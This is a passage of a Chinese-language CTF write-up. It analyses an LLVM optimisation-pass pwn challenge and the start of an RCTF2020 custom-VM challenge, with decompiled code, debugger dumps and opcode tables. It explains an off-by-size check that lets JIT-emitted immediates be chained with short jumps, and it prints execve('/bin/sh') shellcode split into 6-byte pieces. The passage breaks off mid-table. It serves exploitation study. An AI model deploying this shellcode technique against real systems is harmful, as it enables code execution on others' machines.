class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;## Introduction&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;A LLVM Pass that can optimize add/sub instructions.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;## How to run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;opt-12 -load ./mbaPass.so -mba &amp;#123;*.bc/*.ll&amp;#125; -S&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;## Example&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;### IR before optimization&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %2 = sub nsw i64 %0, 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %3 = add nsw i64 %2, 68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %4 = add nsw i64 %0, 6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %5 = add nsw i64 %4, -204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %6 = add nsw i64 %5, %3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ret i64 %6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;### IR after optimization&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %2 = mul i64 %0, 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %3 = add i64 %2, -132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ret i64 %3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;opt-12 对应的就是 llvm-12，而且题目没有给出 opt。有师傅讲 ubuntu18 是不支持 opt-12 的。&lt;/p&gt;
&lt;p&gt;我们看看程序是如何优化代码的，在 handle 部分，有几个点，&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v30 = *((_QWORD *)this + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;0xFF0&lt;/span&gt;LL;        &lt;span class=&#34;comment&#34;&gt;// shellcode结束的地方，0x***ff0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里的 v30 就是指定了我们结束的空间，用来下面判断是会溢出超出这个区域。下面有三个分支，但是我们的目标是最后一个 else&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;                                          &lt;span class=&#34;comment&#34;&gt;// 真实的优化过程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;anonymous namespace&amp;#x27;&lt;/span&gt;::MBAPass::writeMovImm64(this, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;// 在最开始的地方写movabs rax,0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *((_DWORD *)this + &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;&amp;lt;llvm::Value *&amp;gt;::&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;&amp;lt;&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;built_in&#34;&gt;deque&lt;/span&gt;&amp;lt;llvm::Value *&amp;gt;,&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&amp;gt;(v26);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;&amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&amp;gt;::&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;&amp;lt;&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;built_in&#34;&gt;deque&lt;/span&gt;&amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&amp;gt;,&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&amp;gt;(&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;&amp;lt;llvm::Value *&amp;gt;::push(v26, &amp;amp;v27);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v24 = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;&amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&amp;gt;::push(&lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;, &amp;amp;v24);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( *((_QWORD *)this + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;lt; v30 )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行完 *（this+12） = 0 后的情况是在这样的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612213526191.png&#34; alt=&#34;image-20220612213526191&#34;&gt;&lt;/p&gt;
&lt;p&gt;this+12 指向的是 0x4c8d70 四字节。0x4c8c68 是记录当前我们要写入指令的位置。&lt;/p&gt;
&lt;p&gt;writeMovImm64 (this, 0, 0LL)，第二个参数指定寄存器，0 为 rax，1 为 rbx，0LL 是 64 位立即数。同理 writeret 就是向木匾位置写入 ret (0xc3)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; RDI  &lt;span class=&#34;number&#34;&gt;0x4c8c40&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffff21dbd30&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffff21cded0&lt;/span&gt; ◂— push   rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSI  &lt;span class=&#34;number&#34;&gt;0x48af78&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x4ddf80&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fffffffd560&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x4b3820&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x4b3840&lt;/span&gt; ◂— ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R8   &lt;span class=&#34;number&#34;&gt;0x4def70&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x637566&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;fuc&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x48af78&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0x18&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48af60&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000040&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000091&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48af70&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000004ddf80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48af80&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x5000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48af90&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000004ddf50&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000004000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48afa0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000004dbc30&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48afb0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000004dbc48&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000004dbc48&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48afc0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000004df4d8&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000004df4d8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48afd0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000004df490&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000001&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48afe0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000004ddec0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000004de308&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48aff0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000000000bc&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000051&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48b000&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007fff00000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000000000048c410&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48b010&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x000000000048b120&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000000000048acf0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48b020&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x000000000048b030&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000000000000000a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x48b030&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x766e6f6761786568&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xffffffffff003536&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于 handle 函数貌似并没有进行的优化，而是对原有的文件的处理，使用的是堆栈将原来的程序倒序储存进空间内。但是他这里的程序使用的汇编的指令比较少，add，sub，movabs，mul，dec，inc，rax 依旧是程序的返回值，所以最开始一定是对 rax 的初始化。程序的漏洞在于我们可用于储存指令的空间只有 0xff0，但是 mprotect 设置的是 0x1000. 而且程序在防止我们超出空间的时候检查是否小于 X+0xff0，但是如果我们控制知名的长度，将这个位置恰好覆盖为 shellcode。我们在写 add,sub 的汇编时，程序会将其全部转为 mov rbx,xxx,add rax,rbx. 我们可向内存中写入 8 字节的 64 位数，我们可以利用这个。在汇编中 \xeb 对应的指令默认的偏移量时 2，\xeb\x00 jmp 2. 结合上述，我们在第一个函数的结尾，向 0xff0 布置一个 i64, 使其跳转到某个存有 i64 的内存位置。我们通过这样多次跳转一步步完成 shellcoe 的布局，每次跳转栈两字节，所以每条指令不可以超过 6 字节。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;push &lt;span class=&#34;number&#34;&gt;0x68732f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmp $?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shl rax,&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmp $?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add rax,&lt;span class=&#34;number&#34;&gt;0x6069622f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmp $?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov rdi,rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmp $?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xor rdx,rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push &lt;span class=&#34;number&#34;&gt;0x39&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmp $?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xor rsi,rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;RCTF2020&lt;/p&gt;
&lt;p&gt;直接给出了手写的 vm 可执行程序，我们需要理清楚里面的函数逻辑。重点在与子进程中的两个函数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nums_IR = sub_1A75(file);                   // 解析我们输入的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   sub_E99(file, nums_IR);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先当我们输入某种编码形式的指令后，第一个函数会检查我们的输入是否合法，并计算出我们输入了多少条完整的指令。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;解析输入是否合法的时候，有一些op码，大致县分为三块，小于9，等于9以及大于9小于&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0	1	2	3三条指令，根据下1字节的标志，1：有一个寄存器和8字节的数据，0：两个寄存器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	0					1:ADD RI,IMM64;		0:ADD RI,RI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	1					1:SUB RI,IMM64;		0:SUB RI,RI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	2					1:MUL RI,IMM64;		0:MUL RI,RI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	3					1:DIV RI IMM64; 	0:DIV RI ,RI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4	有一个标志位字节，条件1下，后面有9字节的任意数据，条件2需要两个寄存器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		1:MOV RI,IMM64			;4			MOV RI,[IMM64]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		8:MOV RI,RI				;0X10		MOV RI1,[RI2]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		0X20:MOV [RI1],RI2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5	一字节的寄存器号。将ptr+0x50 的值设置为寄存器中的值。    jmp ri&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6	一字节的数据标志位。1：AND RI,IMM64;		0: AND RI,RI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7	p=1:1B，8B   XOR RI,IMM64;			p=0:1B,1B	XOR RI,RI				&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8	标志位	，1：或操作，or ri，imm64  ； 0：两个寄存器或操作，destri为第一个  XOR RI,RI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9	需要一个寄存器，				2B长,设置寄存器		NOT RI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10	需要一个标志位p,为0或者1，&amp;#123;1的时候，后面又8字节的数据，使得ptr+0x40的指针地址-8，并设置为指针指向的值为value，为0的时候，后面紧跟一个寄存器,&amp;#125;								push imm64/push ri&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11	检查ptr+88，要求非零，然后标志数值减一，后面还跟着一字节的数据.ptr+64指针指向的数据+8		pop RI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12	需要1B的操作数，				 2BIR		指令跳转。1B的偏移量，默认+2(吓一个指令)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13	对应一个4字节的value（size）				